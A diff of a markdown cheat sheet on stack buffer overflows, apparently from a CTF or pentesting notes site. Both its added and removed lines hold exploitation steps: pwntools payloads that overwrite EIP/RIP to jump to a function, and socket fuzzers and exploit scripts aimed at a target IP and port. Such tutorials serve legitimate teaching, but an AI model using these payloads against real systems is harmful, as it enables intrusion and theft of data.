@@ -1,41 +1,197 @@
 ---
 title: Buffer Overflow Attack
 desc: An anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.
-tags: [Buffer Overflow, Python, Reverse Engineering]
+tags: [Buffer, Exe, Overflow, Pwndbg, Pwntools]
 alts: [Reverse-Engineering]
 render_with_liquid: false
 ---
 
-## 1. Python Payload
+## 1. Investigation
 
-```python
-python3 -c 'print("A" * 32 + "B" * 8 + "C" * 8)'
-python3 -c 'print("A" * 32 + "BBBBBBBB" + "\x86\x06\x40\x00\x00\x00\x00\x00")'
-# Copy the output string
+1. **Check Security Properties**
 
-# Paste the specific field when executing
-./example.so
-```
+    ```sh
+    checksec ./sampleExe
+    ```
+
+    1. **Binary Qualities**
+
+        - **RELRO** - Relocation Read-Only, which makes the global offset table (GOT) read-only.
+        - **Stack Canaries** - Tokens placed after a stack to detect a stack overflow.
+        - **NX** - Non-Executable. It prevents from shellcode.
+        - **RWX** - Read-Write-Executable. It's vulnerable to shellcode.
+        - **PIE** - Position Independent Executable. It loads the program dependencies into random locations.
+
+2. **Send Data to Check if the Operation**
+
+    1. **Start Executable**
+
+        - **Direcly**
+
+            ```sh
+            ./exampleExe
+            ```
+
+        - **via TCP**
+
+            ```sh
+            nc <target-ip> <target-port>
+            ```
+
+    2. **Input String**
+
+        After starting, input some string to check if the buffer overflow happens.
+
+        ```sh
+        # Input some string
+        hello
+        test
+
+        # Input long string
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+        ```
+
+## 2. Crash Replication and Control EIP/RIP
+
+Instruction Pointer (IP), which is called  the EIP on 32-bit machines, and the RIP on 64-bit machines. The IP points to the next instruction to be executed.
+
+1. **Generate Cyclic Pattern**
+
+    Prepare a long string enough to overwrite the next instruction.
+
+    ```sh
+    # e.g. generate 100 characters
+    cyclic 100 > pattern.txt
+    # or
+    msf-pattern_create -l 100 > pattern.txt
+    ```
+
+2. **Start Debugging with GDB (Pwndbg)**
+
+    Before starting gdb, it’s recommended to setup the **[Pwndbg](https://github.com/pwndbg/pwndbg){:target="_blank"}** for easily debugging.
+
+    ```sh
+    # exampleExe is the example of executable file
+    gdb exampleExe
+    ```
+
+3. **Run Program in Debugger**
+
+    Use the generated text file of cyclic pattern for input.
+
+    ```sh
+    # r: run a program
+    # Add an input from text file
+    r < pattern.txt
+    ```
+
+    If the program crashes, check the invalid address and the EIP’s value of the  output.
+
+    ```sh
+    # They mean there is an invalid address at 0x4a4a4a.
+    # Fir eip, it has been overwritten with 0x4a4a4a4a
+    EIP  0x6161616a ('jaaa')
+
+    Invalid address 0x6161616a
+    ```
+
+4. **Generate an Exploitable Cyclic with Pwntools**
+
+    **[Pwntools](https://github.com/Gallopsled/pwntools){:target="_blank"}** is an exploit development library.  
+    It also generates the exploitable cyclic pattern for buffer overflow attack.
+
+    1. **Create a Generator Named “cyclic.py”.**
+
+        ```py
+        from pwn import *
+
+        padding = cyclic(cyclic_find('jaaa'))
+        eip = p32(0xdeadbeef)
+        payload = padding + eip
+        print(payload)
+        ```
+
+    2. **Generate Pattern**
+
+        Note that you need to run with **Python2**.
+
+        ```sh
+        python2 cyclic.py > pwncyclic.txt
+        ```
+
+    3. **Input the Cyclic in GDB**
+
+        ```sh
+        gdb exampleExe
+
+        # ----------------------------------------
+
+        # In debugger
+
+        # Input the pwn cyclic
+        r < pwncyclic.txt
+        ```
+
+        Make sure that there is an invalid address at 0xdeadbeef.
+
+        ```sh
+        EIP  0xdeadbeef
+
+        Invalid address 0xdeadbeef
+        ```
+
+        Find the location of the target function which will be used to pwn in gdb.
+
+        For example, the executable contains the vulnerable function named “print_sensitive()”:
+
+        ```sh
+        print& print_sensitive
+
+        # e.g. the location of the output is "0x8048536"
+        ```
+
+    4. **Regenerate Cyclic Pattern**
+
+        1. **Replace the Address in Payload**
+
+            Replace the 0xdeadbeef in the payload named “cyclic.py” with the location of the vulnerable function (0x8048536 in here). 
+
+            ```py
+            ...
+
+            eip = p32(0x8048536)
+
+            ...
+            ```
+
+        2. **Regenerate**
+
+            ```sh
+            python2 cyclic.py > pwncyclic.txt
+            ```
+
+        3. **Run Program using New Cyclic Pattern**
+
+            Run the program using this cyclic file as input.  
+            You may be able to retrieve some sensitive data via the vulnerable function.
+
+            ```sh
+            ./exampleExe < pwncyclic.txt
+            ```
 
 <br />
 
-## 2. Check to Crash
+## 3. Fuzzing using Python
 
-1. Creating a Fuzzer using Python
+1. **Create Python Script**
 
-    *fuzzer.py*
-
-    ```python
-    #!/usr/bin/env python3
-
+    ```py
     import socket, time, sys
 
-    ip = "10.0.0.1"
-
-    port = 1337
+    ip = "<target-ip>"
+    port = <target-port>
     timeout = 5
     prefix = "OVERFLOW1 "
-
     string = prefix + "A" * 100
 
     while True:
@@ -54,85 +210,10 @@ python3 -c 'print("A" * 32 + "BBBBBBBB" + "\x86\x06\x40\x00\x00\x00\x00\x00")'
     time.sleep(1)
     ```
 
-2. Executing Script
+2. **Run the Payload**
+
+    When the fuzzer crashes the server with one of the strings, make a note of the largest number of bytes that were sent e.g. “1900 bytes”, “2000bytes”.
 
     ```sh
     python3 fuzzer.py
-    ```
-
-<br />
-
-## 3. Scanf in Object File
-
-Using **[Pwntools](https://github.com/Gallopsled/pwntools)** with Python.
-
-```python
-from pwn import *
-
-# target ip address
-host = "10.0.0.1"
-# target port
-port = 5700
-
-context(terminal = ['tmux', 'new-window'])
-# set target executable
-binary = context.binary = ELF("./example.so")
-context(os = "linux", arch = "amd64")
-
-connect = remote(host, port)
-log.info("[+] Starting bufer overflow")
-# set the executable output
-connect.recvuntil(b"What's your name: ")
-log.info("[+] Crafting payload")
-
-payload = b'A' * 40
-payload += p64(0x00400686)
-log.info("[+] Sending Payload to the remote server")
-# Send payload
-connect.sendline(payload)
-connect.interactive()
-```
-
-<br />
-
-## 4. Socket
-
-1. **Generate a cyclic pattern**
-
-    ```sh
-    # ex. 2000 bytes
-    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
-    ```
-
-    Copy the output string.
-
-2. **Create the Exploit**
-
-    Paste the copied strings (the above cyclic pattern) to the “payload” variable.
-
-    ```python
-    import socket
-
-    ip = "10.0.0.1"
-    port = 1337
-
-    prefix = "OVERFLOW1 "
-    offset = 0
-    overflow = "A" * offset
-    retn = ""
-    padding = ""
-    payload = "<PASTE_A_CYCLIC_PATTERN>"
-    postfix = ""
-
-    buffer = prefix + overflow + retn + padding + payload + postfix
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-    s.connect((ip, port))
-    print("Sending evil buffer...")
-    s.send(bytes(buffer + "\r\n", "latin-1"))
-    print("Done!")
-    except:
-    print("Could not connect.")
     ```
